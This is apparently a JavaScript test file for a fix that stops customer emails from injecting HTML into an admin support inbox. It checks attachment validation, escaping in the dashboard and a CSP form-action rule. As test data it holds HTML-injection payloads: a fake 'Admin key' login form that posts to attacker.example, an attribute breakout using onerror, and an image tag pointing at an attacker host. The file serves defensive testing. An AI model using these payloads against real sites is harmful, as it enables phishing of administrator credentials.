// BA-003: a customer's email can no longer put its own HTML into the /admin
// support inbox.
//
// Anyone can email support@. The sender, the subject and the body text were
// already escaped on the way to the page; the attachment's data: URL and the
// sender label were not, and the server stored whatever came after an image
// part's Content-Type. Three layers now hold, and each is tested on its own:
//   1. the server stores an attachment only if it really is an image of
//      base64 text,
//   2. the dashboard escapes what it still inserts (sender, data URL), and
//   3. the Content-Security-Policy says form-action 'self', so a fake form that
//      got through anyway cannot post to another site.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { describe, it } from "node:test";
import { makeEnv, makeD1, makeKv, call, worker } from "./harness.mjs";

const HOSTILE_BODY = 'x"/><form/action="https://attacker.example"><input/name="k"/placeholder="Admin/key"><button>Sign/in</button></form>';

function mockEmail({ from, subject, messageId, rawBody }) {
  const headers = new Map([["from", from], ["to", "support@mylistsaddon.com"], ["subject", subject], ["message-id", messageId]]);
  const bytes = new TextEncoder().encode(rawBody);
  return {
    from, to: "support@mylistsaddon.com",
    headers: { get: (k) => headers.get(String(k).toLowerCase()) || null },
    raw: new ReadableStream({ start(c) { c.enqueue(bytes); c.close(); } }),
  };
}

function multipart(parts) {
  const b = "==hostile_boundary==";
  return [`Content-Type: multipart/mixed; boundary="${b}"`, "",
    ...parts.flatMap((p) => [`--${b}`, p, ""]), `--${b}--`].join("\r\n");
}

async function adminCookie(env) {
  const login = await call(env, "/admin/login", { method: "POST", form: { key: env.ADMIN_KEY } });
  return (login.headers.get("set-cookie") || "").match(/^([^=]+=[^;]+)/)[1];
}

async function storedAttachments(db) {
  const row = await db.prepare("SELECT attachments_json FROM support_messages").first();
  return row && row.attachments_json ? JSON.parse(row.attachments_json) : [];
}

describe("BA-003: the server stores only real images", () => {
  it("drops an image part whose body is not base64 text", async () => {
    const db = makeD1();
    const env = makeEnv({ CONFIGS: makeKv(), DB: db });
    await worker.email(mockEmail({
      from: "evil@example.com", subject: "hi", messageId: "<a@x>",
      rawBody: multipart([
        "Content-Type: text/plain\r\n\r\nsee attached",
        `Content-Type: image/png; name="a.png"\r\nContent-Transfer-Encoding: base64\r\n\r\n${HOSTILE_BODY}`,
      ]),
    }), env, {});
    assert.deepEqual(await storedAttachments(db), [], "hostile text is not kept as a data URL");
    const row = await db.prepare("SELECT body_text FROM support_messages").first();
    assert.match(row.body_text, /see attached/, "the message itself is still stored");
  });

  it("drops a part whose Content-Type is not image/<subtype>", async () => {
    const db = makeD1();
    const env = makeEnv({ CONFIGS: makeKv(), DB: db });
    await worker.email(mockEmail({
      from: "evil@example.com", subject: "hi", messageId: "<b@x>",
      rawBody: multipart([
        "Content-Type: text/plain\r\n\r\nhello",
        'Content-Type: image/png"onerror="x; name="a.png"\r\n\r\niVBORw0KGgo=',
      ]),
    }), env, {});
    assert.deepEqual(await storedAttachments(db), []);
  });

  it("still keeps a genuine base64 image", async () => {
    const db = makeD1();
    const env = makeEnv({ CONFIGS: makeKv(), DB: db });
    await worker.email(mockEmail({
      from: "ok@example.com", subject: "hi", messageId: "<c@x>",
      rawBody: multipart([
        "Content-Type: text/plain\r\n\r\nhello",
        'Content-Type: image/png; name="a.png"\r\nContent-Transfer-Encoding: base64\r\n\r\niVBORw0KGgo=',
      ]),
    }), env, {});
    const atts = await storedAttachments(db);
    assert.equal(atts.length, 1);
    assert.equal(atts[0].dataUrl, "data:image/png;base64,iVBORw0KGgo=");
  });
});

describe("BA-003: the dashboard escapes what it inserts", () => {
  async function dashboardScript() {
    const env = makeEnv({});
    const cookie = await adminCookie(env);
    const html = (await call(env, "/admin", { cookie })).text;
    const blocks = [...html.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/g)].map((m) => m[1]).sort((a, b) => a.length - b.length);
    return blocks[blocks.length - 1];
  }

  function elements() {
    const els = {};
    return {
      els,
      getElementById(id) { return els[id] || (els[id] = { id, innerHTML: "", textContent: "", style: {}, className: "", scrollTop: 0, scrollHeight: 0, addEventListener() {}, setAttribute() {}, classList: { add() {}, remove() {}, toggle() {} } }); },
    };
  }

  async function loadWithThread(thread, messages) {
    const doc = elements();
    const hole = new Proxy(function () {}, { get: () => hole, apply: () => hole, set: () => true });
    const sandbox = {
      console: { log() {}, warn() {}, error() {} },
      JSON, Math, Date, Object, Array, String, Number, Boolean, Promise, Error, Map, Set, RegExp, encodeURIComponent,
      setTimeout, clearTimeout, setInterval, clearInterval,
      fetch: async () => ({ json: async () => ({ ok: true, thread, messages }) }),
      navigator: { clipboard: {} },
      localStorage: { getItem: () => null, setItem() {}, removeItem() {} },
      location: { hash: "", href: "https://example.com/admin", pathname: "/admin" },
      confirm: () => true,
    };
    sandbox.document = {
      getElementById: (id) => doc.getElementById(id),
      querySelector: () => hole, querySelectorAll: () => [], createElement: () => hole,
      body: hole, documentElement: hole, cookie: "", addEventListener() {},
    };
    sandbox.addEventListener = () => {};
    sandbox.window = sandbox;
    sandbox.globalThis = sandbox;
    vm.createContext(sandbox);
    vm.runInContext(await dashboardScript(), sandbox, { filename: "admin-inline.js" });
    return { sandbox, doc };
  }

  const hostileThread = { id: "th_1", customer_name: "<img src=//attacker.example/p.png>", customer_email: "<b>hi</b>", subject: "s", status: "open", unread: 1, created_at: 1, last_message_at: 1 };

  it("renders the thread list without markup from the sender", async () => {
    const { sandbox, doc } = await loadWithThread(hostileThread, []);
    vm.runInContext("supportEmailThreads = [" + JSON.stringify(hostileThread) + "]; renderSupportEmailThreadList();", sandbox);
    const html = doc.els.supportEmailThreadList.innerHTML;
    assert.ok(html.includes("support-thread-card"), "the list rendered");
    assert.equal(html.includes("<img"), false, "no image from the sender's name");
    assert.equal(html.includes("<b>"), false, "no tag from the sender's address");
    assert.ok(html.includes("&lt;b&gt;hi&lt;/b&gt;"), "the address shows as text");
  });

  it("renders a conversation without a form or a broken-out attribute from an attachment", async () => {
    const msg = {
      id: "m1", direction: "inbound", from_email: "evil@example.com", created_at: 1, body_text: "hi",
      attachments: [{ filename: "a.png", size: 10, dataUrl: HOSTILE_BODY }],
    };
    const { sandbox, doc } = await loadWithThread(hostileThread, [msg]);
    await vm.runInContext("selectSupportEmailThread('th_1')", sandbox);
    const html = doc.els.supportActiveMessageList.innerHTML;
    assert.ok(html.includes("support-bubble"), "the conversation rendered");
    assert.equal(html.includes("<form"), false, "no form from an attachment");
    assert.equal(html.includes("<input"), false, "no input from an attachment");
  });
});

describe("BA-003: the CSP stops forms posting to another site", () => {
  it("carries form-action 'self' on a page", async () => {
    const env = makeEnv({});
    const res = await call(env, "/admin");
    assert.match(res.headers.get("content-security-policy") || "", /(^|; )form-action 'self'(;|$)/);
  });

  it("is still the same-origin forms the site itself posts", () => {
    const src = fs.readFileSync(path.join(path.dirname(new URL(import.meta.url).pathname), "../src/admin/03_admin.js"), "utf8");
    const actions = [...src.matchAll(/<form[^>]*action="([^"]+)"/g)].map((m) => m[1]);
    assert.ok(actions.length >= 1);
    for (const a of actions) assert.ok(a.startsWith("/"), `form action ${a} is same-origin`);
  });
});
